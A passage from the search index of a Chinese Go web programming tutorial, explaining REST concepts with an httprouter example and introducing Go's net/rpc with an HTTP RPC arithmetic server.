<p>\u8981\u7406\u89e3\u4ec0\u4e48\u662fREST\uff0c\u6211\u4eec\u9700\u8981\u7406\u89e3\u4e0b\u9762\u51e0\u4e2a\u6982\u5ff5:</p> <ul> <li>\u8d44\u6e90\uff08Resources\uff09   REST\u662f\"\u8868\u73b0\u5c42\u72b6\u6001\u8f6c\u5316\"\uff0c\u5176\u5b9e\u5b83\u7701\u7565\u4e86\u4e3b\u8bed\u3002\"\u8868\u73b0\u5c42\"\u5176\u5b9e\u6307\u7684\u662f\"\u8d44\u6e90\"\u7684\"\u8868\u73b0\u5c42\"\u3002</li> </ul> <p>\u90a3\u4e48\u4ec0\u4e48\u662f\u8d44\u6e90\u5462\uff1f\u5c31\u662f\u6211\u4eec\u5e73\u5e38\u4e0a\u7f51\u8bbf\u95ee\u7684\u4e00\u5f20\u56fe\u7247\u3001\u4e00\u4e2a\u6587\u6863\u3001\u4e00\u4e2a\u89c6\u9891\u7b49\u3002\u8fd9\u4e9b\u8d44\u6e90\u6211\u4eec\u901a\u8fc7URI\u6765\u5b9a\u4f4d\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2aURI\u8868\u793a\u4e00\u4e2a\u8d44\u6e90\u3002</p> <ul> <li>\u8868\u73b0\u5c42\uff08Representation\uff09</li> </ul> <p>\u8d44\u6e90\u662f\u505a\u4e00\u4e2a\u5177\u4f53\u7684\u5b9e\u4f53\u4fe1\u606f\uff0c\u4ed6\u53ef\u4ee5\u6709\u591a\u79cd\u7684\u5c55\u73b0\u65b9\u5f0f\u3002\u800c\u628a\u5b9e\u4f53\u5c55\u73b0\u51fa\u6765\u5c31\u662f\u8868\u73b0\u5c42\uff0c\u4f8b\u5982\u4e00\u4e2atxt\u6587\u672c\u4fe1\u606f\uff0c\u4ed6\u53ef\u4ee5\u8f93\u51fa\u6210html\u3001json\u3001xml\u7b49\u683c\u5f0f\uff0c\u4e00\u4e2a\u56fe\u7247\u4ed6\u53ef\u4ee5jpg\u3001png\u7b49\u65b9\u5f0f\u5c55\u73b0\uff0c\u8fd9\u4e2a\u5c31\u662f\u8868\u73b0\u5c42\u7684\u610f\u601d\u3002</p> <p>URI\u786e\u5b9a\u4e00\u4e2a\u8d44\u6e90\uff0c\u4f46\u662f\u5982\u4f55\u786e\u5b9a\u5b83\u7684\u5177\u4f53\u8868\u73b0\u5f62\u5f0f\u5462\uff1f\u5e94\u8be5\u5728HTTP\u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u4e2d\u7528Accept\u548cContent-Type\u5b57\u6bb5\u6307\u5b9a\uff0c\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u624d\u662f\u5bf9\"\u8868\u73b0\u5c42\"\u7684\u63cf\u8ff0\u3002</p> <ul> <li>\u72b6\u6001\u8f6c\u5316\uff08State Transfer\uff09</li> </ul> <p>\u8bbf\u95ee\u4e00\u4e2a\u7f51\u7ad9\uff0c\u5c31\u4ee3\u8868\u4e86\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7684\u4e00\u4e2a\u4e92\u52a8\u8fc7\u7a0b\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u80af\u5b9a\u6d89\u53ca\u5230\u6570\u636e\u548c\u72b6\u6001\u7684\u53d8\u5316\u3002\u800cHTTP\u534f\u8bae\u662f\u65e0\u72b6\u6001\u7684\uff0c\u90a3\u4e48\u8fd9\u4e9b\u72b6\u6001\u80af\u5b9a\u4fdd\u5b58\u5728\u670d\u52a1\u5668\u7aef\uff0c\u6240\u4ee5\u5982\u679c\u5ba2\u6237\u7aef\u60f3\u8981\u901a\u77e5\u670d\u52a1\u5668\u7aef\u6539\u53d8\u6570\u636e\u548c\u72b6\u6001\u7684\u53d8\u5316\uff0c\u80af\u5b9a\u8981\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\u6765\u901a\u77e5\u5b83\u3002</p> <p>\u5ba2\u6237\u7aef\u80fd\u901a\u77e5\u670d\u52a1\u5668\u7aef\u7684\u624b\u6bb5\uff0c\u53ea\u80fd\u662fHTTP\u534f\u8bae\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662fHTTP\u534f\u8bae\u91cc\u9762\uff0c\u56db\u4e2a\u8868\u793a\u64cd\u4f5c\u65b9\u5f0f\u7684\u52a8\u8bcd\uff1aGET\u3001POST\u3001PUT\u3001DELETE\u3002\u5b83\u4eec\u5206\u522b\u5bf9\u5e94\u56db\u79cd\u57fa\u672c\u64cd\u4f5c\uff1aGET\u7528\u6765\u83b7\u53d6\u8d44\u6e90\uff0cPOST\u7528\u6765\u65b0\u5efa\u8d44\u6e90\uff08\u4e5f\u53ef\u4ee5\u7528\u4e8e\u66f4\u65b0\u8d44\u6e90\uff09\uff0cPUT\u7528\u6765\u66f4\u65b0\u8d44\u6e90\uff0cDELETE\u7528\u6765\u5220\u9664\u8d44\u6e90\u3002</p> <p>\u7efc\u5408\u4e0a\u9762\u7684\u89e3\u91ca\uff0c\u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4ec0\u4e48\u662fRESTful\u67b6\u6784\uff1a</p> <ul> <li>\uff081\uff09\u6bcf\u4e00\u4e2aURI\u4ee3\u8868\u4e00\u79cd\u8d44\u6e90\uff1b</li> <li>\uff082\uff09\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\uff0c\u4f20\u9012\u8fd9\u79cd\u8d44\u6e90\u7684\u67d0\u79cd\u8868\u73b0\u5c42\uff1b</li> <li>\uff083\uff09\u5ba2\u6237\u7aef\u901a\u8fc7\u56db\u4e2aHTTP\u52a8\u8bcd\uff0c\u5bf9\u670d\u52a1\u5668\u7aef\u8d44\u6e90\u8fdb\u884c\u64cd\u4f5c\uff0c\u5b9e\u73b0\"\u8868\u73b0\u5c42\u72b6\u6001\u8f6c\u5316\"\u3002</li> </ul> <p>Web\u5e94\u7528\u8981\u6ee1\u8db3REST\u6700\u91cd\u8981\u7684\u539f\u5219\u662f:\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u4ea4\u4e92\u5728\u8bf7\u6c42\u4e4b\u95f4\u662f\u65e0\u72b6\u6001\u7684,\u5373\u4ece\u5ba2\u6237\u7aef\u5230\u670d\u52a1\u5668\u7684\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u5fc5\u987b\u5305\u542b\u7406\u89e3\u8bf7\u6c42\u6240\u5fc5\u9700\u7684\u4fe1\u606f\u3002\u5982\u679c\u670d\u52a1\u5668\u5728\u8bf7\u6c42\u4e4b\u95f4\u7684\u4efb\u4f55\u65f6\u95f4\u70b9\u91cd\u542f\uff0c\u5ba2\u6237\u7aef\u4e0d\u4f1a\u5f97\u5230\u901a\u77e5\u3002\u6b64\u5916\u6b64\u8bf7\u6c42\u53ef\u4ee5\u7531\u4efb\u4f55\u53ef\u7528\u670d\u52a1\u5668\u56de\u7b54\uff0c\u8fd9\u5341\u5206\u9002\u5408\u4e91\u8ba1\u7b97\u4e4b\u7c7b\u7684\u73af\u5883\u3002\u56e0\u4e3a\u662f\u65e0\u72b6\u6001\u7684\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u53ef\u4ee5\u7f13\u5b58\u6570\u636e\u4ee5\u6539\u8fdb\u6027\u80fd\u3002</p> <p>\u53e6\u4e00\u4e2a\u91cd\u8981\u7684REST\u539f\u5219\u662f\u7cfb\u7edf\u5206\u5c42\uff0c\u8fd9\u8868\u793a\u7ec4\u4ef6\u65e0\u6cd5\u4e86\u89e3\u9664\u4e86\u4e0e\u5b83\u76f4\u63a5\u4ea4\u4e92\u7684\u5c42\u6b21\u4ee5\u5916\u7684\u7ec4\u4ef6\u3002\u901a\u8fc7\u5c06\u7cfb\u7edf\u77e5\u8bc6\u9650\u5236\u5728\u5355\u4e2a\u5c42\uff0c\u53ef\u4ee5\u9650\u5236\u6574\u4e2a\u7cfb\u7edf\u7684\u590d\u6742\u6027\uff0c\u4ece\u800c\u4fc3\u8fdb\u4e86\u5e95\u5c42\u7684\u72ec\u7acb\u6027\u3002</p> <p>\u4e0b\u56fe\u5373\u662fREST\u7684\u67b6\u6784\u56fe\uff1a</p> <p></p> <p>\u56fe8.5 REST\u67b6\u6784\u56fe</p> <p>\u5f53REST\u67b6\u6784\u7684\u7ea6\u675f\u6761\u4ef6\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u5e94\u7528\u65f6\uff0c\u5c06\u751f\u6210\u4e00\u4e2a\u53ef\u4ee5\u6269\u5c55\u5230\u5927\u91cf\u5ba2\u6237\u7aef\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u8fd8\u964d\u4f4e\u4e86\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u4ea4\u4e92\u5ef6\u8fdf\u3002\u7edf\u4e00\u754c\u9762\u7b80\u5316\u4e86\u6574\u4e2a\u7cfb\u7edf\u67b6\u6784\uff0c\u6539\u8fdb\u4e86\u5b50\u7cfb\u7edf\u4e4b\u95f4\u4ea4\u4e92\u7684\u53ef\u89c1\u6027\u3002REST\u7b80\u5316\u4e86\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7684\u5b9e\u73b0\uff0c\u800c\u4e14\u5bf9\u4e8e\u4f7f\u7528REST\u5f00\u53d1\u7684\u5e94\u7528\u7a0b\u5e8f\u66f4\u52a0\u5bb9\u6613\u6269\u5c55\u3002</p> <p>\u4e0b\u56fe\u5c55\u793a\u4e86REST\u7684\u6269\u5c55\u6027\uff1a</p> <p></p> <p>\u56fe8.6 REST\u7684\u6269\u5c55\u6027</p>"},{"location":"08.3/#restful","title":"RESTful\u7684\u5b9e\u73b0","text":"<p>Go\u6ca1\u6709\u4e3aREST\u63d0\u4f9b\u76f4\u63a5\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3aRESTful\u662f\u57fa\u4e8eHTTP\u534f\u8bae\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528<code>net/http</code>\u5305\u6765\u81ea\u5df1\u5b9e\u73b0\uff0c\u5f53\u7136\u9700\u8981\u9488\u5bf9REST\u505a\u4e00\u4e9b\u6539\u9020\uff0cREST\u662f\u6839\u636e\u4e0d\u540c\u7684method\u6765\u5904\u7406\u76f8\u5e94\u7684\u8d44\u6e90\uff0c\u76ee\u524d\u5df2\u7ecf\u5b58\u5728\u7684\u5f88\u591a\u81ea\u79f0\u662fREST\u7684\u5e94\u7528\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709\u771f\u6b63\u7684\u5b9e\u73b0REST\uff0c\u6211\u6682\u4e14\u628a\u8fd9\u4e9b\u5e94\u7528\u6839\u636e\u5b9e\u73b0\u7684method\u5206\u6210\u51e0\u4e2a\u7ea7\u522b\uff0c\u8bf7\u770b\u4e0b\u56fe\uff1a</p> <p></p> <p>\u56fe8.7 REST\u7684level\u5206\u7ea7</p> <p>\u4e0a\u56fe\u5c55\u793a\u4e86\u6211\u4eec\u76ee\u524d\u5b9e\u73b0REST\u7684\u4e09\u4e2alevel\uff0c\u6211\u4eec\u5728\u5e94\u7528\u5f00\u53d1\u7684\u65f6\u5019\u4e5f\u4e0d\u4e00\u5b9a\u5168\u90e8\u6309\u7167RESTful\u7684\u89c4\u5219\u5168\u90e8\u5b9e\u73b0\u4ed6\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6709\u4e9b\u65f6\u5019\u5b8c\u5168\u6309\u7167RESTful\u7684\u65b9\u5f0f\u672a\u5fc5\u662f\u53ef\u884c\u7684\uff0cRESTful\u670d\u52a1\u5145\u5206\u5229\u7528\u6bcf\u4e00\u4e2aHTTP\u65b9\u6cd5\uff0c\u5305\u62ec<code>DELETE</code>\u548c<code>PUT</code>\u3002\u53ef\u6709\u65f6\uff0cHTTP\u5ba2\u6237\u7aef\u53ea\u80fd\u53d1\u51fa<code>GET</code>\u548c<code>POST</code>\u8bf7\u6c42\uff1a</p> <ul> <li> <p>HTML\u6807\u51c6\u53ea\u80fd\u901a\u8fc7\u94fe\u63a5\u548c\u8868\u5355\u652f\u6301<code>GET</code>\u548c<code>POST</code>\u3002\u5728\u6ca1\u6709Ajax\u652f\u6301\u7684\u7f51\u9875\u6d4f\u89c8\u5668\u4e2d\u4e0d\u80fd\u53d1\u51fa<code>PUT</code>\u6216<code>DELETE</code>\u547d\u4ee4</p> </li> <li> <p>\u6709\u4e9b\u9632\u706b\u5899\u4f1a\u6321\u4f4fHTTP <code>PUT</code>\u548c<code>DELETE</code>\u8bf7\u6c42\uff0c\u8981\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\uff0c\u5ba2\u6237\u7aef\u9700\u8981\u628a\u5b9e\u9645\u7684<code>PUT</code>\u548c<code>DELETE</code>\u8bf7\u6c42\u901a\u8fc7 POST \u8bf7\u6c42\u7a7f\u900f\u8fc7\u6765\u3002RESTful \u670d\u52a1\u5219\u8981\u8d1f\u8d23\u5728\u6536\u5230\u7684 POST \u8bf7\u6c42\u4e2d\u627e\u5230\u539f\u59cb\u7684 HTTP \u65b9\u6cd5\u5e76\u8fd8\u539f\u3002</p> </li> </ul> <p>\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u901a\u8fc7<code>POST</code>\u91cc\u9762\u589e\u52a0\u9690\u85cf\u5b57\u6bb5<code>_method</code>\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u6765\u6a21\u62df<code>PUT</code>\u3001<code>DELETE</code>\u7b49\u65b9\u5f0f\uff0c\u4f46\u662f\u670d\u52a1\u5668\u7aef\u9700\u8981\u505a\u8f6c\u6362\u3002\u6211\u73b0\u5728\u7684\u9879\u76ee\u91cc\u9762\u5c31\u6309\u7167\u8fd9\u79cd\u65b9\u5f0f\u6765\u505a\u7684REST\u63a5\u53e3\u3002\u5f53\u7136Go\u8bed\u8a00\u91cc\u9762\u5b8c\u5168\u6309\u7167RESTful\u6765\u5b9e\u73b0\u662f\u5f88\u5bb9\u6613\u7684\uff0c\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u5982\u4f55\u5b9e\u73b0RESTful\u7684\u5e94\u7528\u8bbe\u8ba1\u3002</p> <p><pre><code>package main\n\nimport (\n\"fmt\"\n\"log\"\n\"net/http\"\n\n\"github.com/julienschmidt/httprouter\"\n)\n\nfunc Index(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {\nfmt.Fprint(w, \"Welcome!\\n\")\n}\n\nfunc Hello(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {\nfmt.Fprintf(w, \"hello, %s!\\n\", ps.ByName(\"name\"))\n}\n\nfunc getuser(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {\nuid := ps.ByName(\"uid\")\nfmt.Fprintf(w, \"you are get user %s\", uid)\n}\n\nfunc modifyuser(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {\nuid := ps.ByName(\"uid\")\nfmt.Fprintf(w, \"you are modify user %s\", uid)\n}\n\nfunc deleteuser(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {\nuid := ps.ByName(\"uid\")\nfmt.Fprintf(w, \"you are delete user %s\", uid)\n}\n\nfunc adduser(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {\n// uid := r.FormValue(\"uid\")\nuid := ps.ByName(\"uid\")\nfmt.Fprintf(w, \"you are add user %s\", uid)\n}\n\nfunc main() {\nrouter := httprouter.New()\nrouter.GET(\"/\", Index)\nrouter.GET(\"/hello/:name\", Hello)\n\nrouter.GET(\"/user/:uid\", getuser)\nrouter.POST(\"/adduser/:uid\", adduser)\nrouter.DELETE(\"/deluser/:uid\", deleteuser)\nrouter.PUT(\"/moduser/:uid\", modifyuser)\n\nlog.Fatal(http.ListenAndServe(\":8080\", router))\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u7f16\u5199\u4e00\u4e2aREST\u7684\u5e94\u7528\uff0c\u6211\u4eec\u8bbf\u95ee\u7684\u8d44\u6e90\u662f\u7528\u6237\uff0c\u6211\u4eec\u901a\u8fc7\u4e0d\u540c\u7684method\u6765\u8bbf\u95ee\u4e0d\u540c\u7684\u51fd\u6570\uff0c\u8fd9\u91cc\u4f7f\u7528\u4e86\u7b2c\u4e09\u65b9\u5e93<code>github.com/julienschmidt/httprouter</code>\uff0c\u5728\u524d\u9762\u7ae0\u8282\u6211\u4eec\u4ecb\u7ecd\u8fc7\u5982\u4f55\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u8def\u7531\u5668\uff0c\u8fd9\u4e2a\u5e93\u5b9e\u73b0\u4e86\u81ea\u5b9a\u4e49\u8def\u7531\u548c\u65b9\u4fbf\u7684\u8def\u7531\u89c4\u5219\u6620\u5c04\uff0c\u901a\u8fc7\u5b83\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5b9e\u73b0REST\u7684\u67b6\u6784\u3002\u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u77e5\uff0cREST\u5c31\u662f\u6839\u636e\u4e0d\u540c\u7684method\u8bbf\u95ee\u540c\u4e00\u4e2a\u8d44\u6e90\u7684\u65f6\u5019\u5b9e\u73b0\u4e0d\u540c\u7684\u903b\u8f91\u5904\u7406\u3002</p>"},{"location":"08.3/#_1","title":"\u603b\u7ed3","text":"<p>REST\u662f\u4e00\u79cd\u67b6\u6784\u98ce\u683c\uff0c\u6c72\u53d6\u4e86WWW\u7684\u6210\u529f\u7ecf\u9a8c\uff1a\u65e0\u72b6\u6001\uff0c\u4ee5\u8d44\u6e90\u4e3a\u4e2d\u5fc3\uff0c\u5145\u5206\u5229\u7528HTTP\u534f\u8bae\u548cURI\u534f\u8bae\uff0c\u63d0\u4f9b\u7edf\u4e00\u7684\u63a5\u53e3\u5b9a\u4e49\uff0c\u4f7f\u5f97\u5b83\u4f5c\u4e3a\u4e00\u79cd\u8bbe\u8ba1Web\u670d\u52a1\u7684\u65b9\u6cd5\u800c\u53d8\u5f97\u6d41\u884c\u3002\u5728\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u901a\u8fc7\u5f3a\u8c03URI\u548cHTTP\u7b49\u65e9\u671fInternet\u6807\u51c6\uff0cREST\u662f\u5bf9\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\u670d\u52a1\u5668\u65f6\u4ee3\u4e4b\u524d\u7684Web\u65b9\u5f0f\u7684\u56de\u5f52\u3002\u76ee\u524dGo\u5bf9\u4e8eREST\u7684\u652f\u6301\u8fd8\u662f\u5f88\u7b80\u5355\u7684\uff0c\u901a\u8fc7\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u8def\u7531\u89c4\u5219\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4e3a\u4e0d\u540c\u7684method\u5b9e\u73b0\u4e0d\u540c\u7684handle\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86REST\u7684\u67b6\u6784\u3002</p>"},{"location":"08.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: WebSocket</li> <li>\u4e0b\u4e00\u8282: RPC</li> </ul>"},{"location":"08.4/","title":"8.4 RPC","text":"<p>\u524d\u9762\u51e0\u4e2a\u5c0f\u8282\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u57fa\u4e8eSocket\u548cHTTP\u6765\u7f16\u5199\u7f51\u7edc\u5e94\u7528\uff0c\u901a\u8fc7\u5b66\u4e60\u6211\u4eec\u4e86\u89e3\u4e86Socket\u548cHTTP\u91c7\u7528\u7684\u662f\u7c7b\u4f3c\"\u4fe1\u606f\u4ea4\u6362\"\u6a21\u5f0f\uff0c\u5373\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u6761\u4fe1\u606f\u5230\u670d\u52a1\u7aef\uff0c\u7136\u540e(\u4e00\u822c\u6765\u8bf4)\u670d\u52a1\u5668\u7aef\u90fd\u4f1a\u8fd4\u56de\u4e00\u5b9a\u7684\u4fe1\u606f\u4ee5\u8868\u793a\u54cd\u5e94\u3002\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4e4b\u95f4\u7ea6\u5b9a\u4e86\u4ea4\u4e92\u4fe1\u606f\u7684\u683c\u5f0f\uff0c\u4ee5\u4fbf\u53cc\u65b9\u90fd\u80fd\u591f\u89e3\u6790\u4ea4\u4e92\u6240\u4ea7\u751f\u7684\u4fe1\u606f\u3002\u4f46\u662f\u5f88\u591a\u72ec\u7acb\u7684\u5e94\u7528\u5e76\u6ca1\u6709\u91c7\u7528\u8fd9\u79cd\u6a21\u5f0f\uff0c\u800c\u662f\u91c7\u7528\u7c7b\u4f3c\u5e38\u89c4\u7684\u51fd\u6570\u8c03\u7528\u7684\u65b9\u5f0f\u6765\u5b8c\u6210\u60f3\u8981\u7684\u529f\u80fd\u3002</p> <p>RPC\u5c31\u662f\u60f3\u5b9e\u73b0\u51fd\u6570\u8c03\u7528\u6a21\u5f0f\u7684\u7f51\u7edc\u5316\u3002\u5ba2\u6237\u7aef\u5c31\u50cf\u8c03\u7528\u672c\u5730\u51fd\u6570\u4e00\u6837\uff0c\u7136\u540e\u5ba2\u6237\u7aef\u628a\u8fd9\u4e9b\u53c2\u6570\u6253\u5305\u4e4b\u540e\u901a\u8fc7\u7f51\u7edc\u4f20\u9012\u5230\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u89e3\u5305\u5230\u5904\u7406\u8fc7\u7a0b\u4e2d\u6267\u884c\uff0c\u7136\u540e\u6267\u884c\u7684\u7ed3\u679c\u53cd\u9988\u7ed9\u5ba2\u6237\u7aef\u3002</p> <p>RPC\uff08Remote Procedure Call Protocol\uff09\u2014\u2014\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u534f\u8bae\uff0c\u662f\u4e00\u79cd\u901a\u8fc7\u7f51\u7edc\u4ece\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e0a\u8bf7\u6c42\u670d\u52a1\uff0c\u800c\u4e0d\u9700\u8981\u4e86\u89e3\u5e95\u5c42\u7f51\u7edc\u6280\u672f\u7684\u534f\u8bae\u3002\u5b83\u5047\u5b9a\u67d0\u4e9b\u4f20\u8f93\u534f\u8bae\u7684\u5b58\u5728\uff0c\u5982TCP\u6216UDP\uff0c\u4ee5\u4fbf\u4e3a\u901a\u4fe1\u7a0b\u5e8f\u4e4b\u95f4\u643a\u5e26\u4fe1\u606f\u6570\u636e\u3002\u901a\u8fc7\u5b83\u53ef\u4ee5\u4f7f\u51fd\u6570\u8c03\u7528\u6a21\u5f0f\u7f51\u7edc\u5316\u3002\u5728OSI\u7f51\u7edc\u901a\u4fe1\u6a21\u578b\u4e2d\uff0cRPC\u8de8\u8d8a\u4e86\u4f20\u8f93\u5c42\u548c\u5e94\u7528\u5c42\u3002RPC\u4f7f\u5f97\u5f00\u53d1\u5305\u62ec\u7f51\u7edc\u5206\u5e03\u5f0f\u591a\u7a0b\u5e8f\u5728\u5185\u7684\u5e94\u7528\u7a0b\u5e8f\u66f4\u52a0\u5bb9\u6613\u3002</p>"},{"location":"08.4/#rpc","title":"RPC\u5de5\u4f5c\u539f\u7406","text":"<p>\u56fe8.8 RPC\u5de5\u4f5c\u6d41\u7a0b\u56fe</p> <p>\u8fd0\u884c\u65f6,\u4e00\u6b21\u5ba2\u6237\u673a\u5bf9\u670d\u52a1\u5668\u7684RPC\u8c03\u7528,\u5176\u5185\u90e8\u64cd\u4f5c\u5927\u81f4\u6709\u5982\u4e0b\u5341\u6b65\uff1a</p> <ul> <li>1.\u8c03\u7528\u5ba2\u6237\u7aef\u53e5\u67c4\uff1b\u6267\u884c\u4f20\u9001\u53c2\u6570</li> <li>2.\u8c03\u7528\u672c\u5730\u7cfb\u7edf\u5185\u6838\u53d1\u9001\u7f51\u7edc\u6d88\u606f</li> <li>3.\u6d88\u606f\u4f20\u9001\u5230\u8fdc\u7a0b\u4e3b\u673a</li> <li>4.\u670d\u52a1\u5668\u53e5\u67c4\u5f97\u5230\u6d88\u606f\u5e76\u53d6\u5f97\u53c2\u6570</li> <li>5.\u6267\u884c\u8fdc\u7a0b\u8fc7\u7a0b</li> <li>6.\u6267\u884c\u7684\u8fc7\u7a0b\u5c06\u7ed3\u679c\u8fd4\u56de\u670d\u52a1\u5668\u53e5\u67c4</li> <li>7.\u670d\u52a1\u5668\u53e5\u67c4\u8fd4\u56de\u7ed3\u679c\uff0c\u8c03\u7528\u8fdc\u7a0b\u7cfb\u7edf\u5185\u6838</li> <li>8.\u6d88\u606f\u4f20\u56de\u672c\u5730\u4e3b\u673a</li> <li>9.\u5ba2\u6237\u53e5\u67c4\u7531\u5185\u6838\u63a5\u6536\u6d88\u606f</li> <li>10.\u5ba2\u6237\u63a5\u6536\u53e5\u67c4\u8fd4\u56de\u7684\u6570\u636e</li> </ul>"},{"location":"08.4/#go-rpc","title":"Go RPC","text":"<p>Go\u6807\u51c6\u5305\u4e2d\u5df2\u7ecf\u63d0\u4f9b\u4e86\u5bf9RPC\u7684\u652f\u6301\uff0c\u800c\u4e14\u652f\u6301\u4e09\u4e2a\u7ea7\u522b\u7684RPC\uff1aTCP\u3001HTTP\u3001JSONRPC\u3002\u4f46Go\u7684RPC\u5305\u662f\u72ec\u4e00\u65e0\u4e8c\u7684RPC\uff0c\u5b83\u548c\u4f20\u7edf\u7684RPC\u7cfb\u7edf\u4e0d\u540c\uff0c\u5b83\u53ea\u652f\u6301Go\u5f00\u53d1\u7684\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u4e4b\u95f4\u7684\u4ea4\u4e92\uff0c\u56e0\u4e3a\u5728\u5185\u90e8\uff0c\u5b83\u4eec\u91c7\u7528\u4e86Gob\u6765\u7f16\u7801\u3002</p> <p>Go RPC\u7684\u51fd\u6570\u53ea\u6709\u7b26\u5408\u4e0b\u9762\u7684\u6761\u4ef6\u624d\u80fd\u88ab\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u4e0d\u7136\u4f1a\u88ab\u5ffd\u7565\uff0c\u8be6\u7ec6\u7684\u8981\u6c42\u5982\u4e0b\uff1a</p> <ul> <li>\u51fd\u6570\u5fc5\u987b\u662f\u5bfc\u51fa\u7684(\u9996\u5b57\u6bcd\u5927\u5199)</li> <li>\u5fc5\u987b\u6709\u4e24\u4e2a\u5bfc\u51fa\u7c7b\u578b\u7684\u53c2\u6570\uff0c</li> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u63a5\u6536\u7684\u53c2\u6570\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u7684\u53c2\u6570\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u6307\u9488\u7c7b\u578b\u7684</li> <li>\u51fd\u6570\u8fd8\u8981\u6709\u4e00\u4e2a\u8fd4\u56de\u503cerror</li> </ul> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6b63\u786e\u7684RPC\u51fd\u6570\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>func (t *T) MethodName(argType T1, replyType *T2) error\n</code></pre> <p>T\u3001T1\u548cT2\u7c7b\u578b\u5fc5\u987b\u80fd\u88ab<code>encoding/gob</code>\u5305\u7f16\u89e3\u7801\u3002</p> <p>\u4efb\u4f55\u7684RPC\u90fd\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u6765\u4f20\u9012\u6570\u636e\uff0cGo RPC\u53ef\u4ee5\u5229\u7528HTTP\u548cTCP\u6765\u4f20\u9012\u6570\u636e\uff0c\u5229\u7528HTTP\u7684\u597d\u5904\u662f\u53ef\u4ee5\u76f4\u63a5\u590d\u7528<code>net/http</code>\u91cc\u9762\u7684\u4e00\u4e9b\u51fd\u6570\u3002\u8be6\u7ec6\u7684\u4f8b\u5b50\u8bf7\u770b\u4e0b\u9762\u7684\u5b9e\u73b0</p>"},{"location":"08.4/#http-rpc","title":"HTTP RPC","text":"<p>http\u7684\u670d\u52a1\u7aef\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <p><pre><code>package main\n\nimport (\n\"errors\"\n\"fmt\"\n\"net/http\"\n\"net/rpc\"\n)\n\ntype Args struct {\nA, B int\n}\n\ntype Quotient struct {\nQuo, Rem int\n}\n\ntype Arith int\n\nfunc (t *Arith) Multiply(args *Args, reply *int) error {\n*reply = args.A * args.B\nreturn nil\n}\n\nfunc (t *Arith) Divide(args *Args, quo *Quotient) error {\nif args.B == 0 {\nreturn errors.New(\"divide by zero\")\n}\nquo.Quo = args.A / args.B\nquo.Rem = args.A % args.B\nreturn nil\n}\n\nfunc main() {\n\narith := new(Arith)\nrpc.Register(arith)\nrpc.HandleHTTP()\n\nerr := http.ListenAndServe(\":1234\", nil)\nif err != nil {\nfmt.Println(err.Error())\n}\n}\n</code></pre> 